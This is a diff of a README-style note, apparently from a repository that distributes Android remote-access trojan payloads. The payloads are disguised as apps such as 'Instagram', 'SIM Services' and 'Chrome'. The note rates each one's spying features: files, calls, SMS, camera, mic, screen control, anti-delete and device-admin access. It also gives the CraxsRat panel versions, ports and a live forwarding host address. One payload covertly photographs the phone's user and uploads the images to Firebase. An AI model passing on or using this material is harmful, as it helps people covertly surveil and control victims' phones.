@@ -1,15 +1,18 @@
-Rename back all the payloads after download otherwise they won't work. (If Ahmyth.apk1 then rename back to Ahyth.apk then Install)
+(If payload.apk1 then rename back to Ahyth.apk then Install)
 
-1- Ahmyth Works with a very mean features (File, Call, SMS, Infos.)
+1- [Ahmyth] Works with a very mean features (File, Call, SMS, Infos.)
 
-2- 888 Chrome payload works a little more than Ahmyth's payload. (No Camera feature, Not Interesting)
+2- [888 Chrome payload] comes with a little more features than [Ahmyth]'s payload. (No Camera feature, Not Interesting)
 
-3- Cypher Beast doesn't work on its own terminal, it works on Craxsrat v6.4, Port remains the same- 8048(Only camera, Mic, Files and other Device info)
+3- [Cypher Advanced] doesn't work on its own terminal, it works on Craxsrat v6.4, Port remains the same- 8048(Only camera, Mic, Files and other Device info)
 
-4- SIM Services- Terminal Craxsrat v7.4 ( Works Badass 🔥, All features [No Anti-Delete, No Admin Access]) Host IP-PORT- 147.185.221.20:63108 Listening IP-PORT- 127.0.0.1:8869 (port- 8869, Craxsrat v7.4)
+4- [SIM Services .Port-8869] Terminal Craxsrat v7.4 ( Works Badass 🔥, All features [No Anti-Delete, No Device Admin Access]) [playit.gg port forwarding] Host IP-PORT- 147.185.221.20:63108 Listening IP-PORT- 127.0.0.1:8869 (port- 8869, Craxsrat v7.4)
 
-5- Instagram is for a very basic features, No port forewarding(Files, mic, Send SMS and FUN commands)
+5- [Instagram] is for a very basic features, No port forewarding(Files, mic, Send SMS and FUN commands)
 
-6- SIM Services Super Mod 8869 (Badass 🔥🔥🔥 Not Recommended, You may required to Format or Hard Reset in order to Delete the Payload)- Anti-Delete, Admin Access, Control Screen, Everything
+6- [SIM Services Super Mod] [port-8869] (Badass 🔥🔥🔥 Not Recommended, You may required to Format or Hard Reset in order to Delete the Payload)- Anti-Delete, Admin Access, Control Screen, Everything. CraxsRat 7.4 is the Admin panel.⚙️
 
+7- [Instagram with Camera] (Updated on 3.09.24 Tue) is the just the [Instagram] payload with camera snapping feature. It captures the selfie and uploads to the Firebase storage. You can have access to them.
+
+Regards @Ganga 
 PEACE OUT 🙊
